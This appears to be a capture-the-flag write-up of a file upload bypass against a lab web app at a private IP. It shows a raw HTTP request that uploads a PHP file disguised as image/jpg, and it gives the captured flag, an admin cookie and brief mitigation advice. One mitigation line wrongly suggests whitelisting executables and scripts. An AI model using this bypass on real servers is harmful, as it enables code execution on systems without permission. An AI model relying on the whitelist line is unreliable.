# File Upload Vulnerability Definition

File upload vulnerability is a common security issue found in web applications. Whenever the web server accepts a file without validating it or keeping any restriction, it is considered as an unrestricted file upload.  
In many web servers, the vulnerability depends entirely on its purpose, allowing a remote attacker to upload a file with malicious content. This might end up in the execution of unrestricted code in the server. File upload vulnerability can be exploited in many ways, including the usage of specially crafted multipart form-data POST requests with particular filename or mime type.

# Steps

This vulnerability exist on `http://192.168.1.9/index.php?page=upload`  
We try to upload php file  
output:

```
Your image was not uploaded.
```

So we use Burp suite to change the content type of file send to server
Request:

```
POST /index.php?page=upload HTTP/1.1
Host: 192.168.1.9
Content-Length: 429
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiFDBox1rlqcnR6Qg
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://192.168.1.9/index.php?page=upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close

------WebKitFormBoundaryiFDBox1rlqcnR6Qg
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryiFDBox1rlqcnR6Qg
Content-Disposition: form-data; name="uploaded"; filename="file_upload.php"
Content-Type: image/jpg

<?php

echo "Work!";

?>
------WebKitFormBoundaryiFDBox1rlqcnR6Qg
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryiFDBox1rlqcnR6Qg--
```

And the file succesfully uploaded and we get the flag!

# Flag: 46910D9CE35B385885A9F7E2B336249D622F29B267A1771FBACF52133BEDDBA8

# Prevent File Upload Vulnerability

### File type verification

File types are usually defined by their file extensions. Each file type usually has several corresponding file extensions. The file extensions enable the operating system and users to easily identify the type of file.  
Attackers can bypass security systems and spoof operating systems and users by changing file extensions. For example, hackers can rename a malicious .exe file into a legitimate-looking .docx file. To prevent this, you must verify the file type before allowing upload.

### Restrict specific file extensions

A whitelist provides system access only to administrator-approved programs, IPs and email addresses. Creating a white list of allowed files enables you to avoid uploads of potentially malicious content to your site. The white list can include executables, scripts and any other file type.

# Resources

### [Unrestricted File Upload OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

### [Exercise 1](https://www.hacksplaining.com/exercises/file-upload)
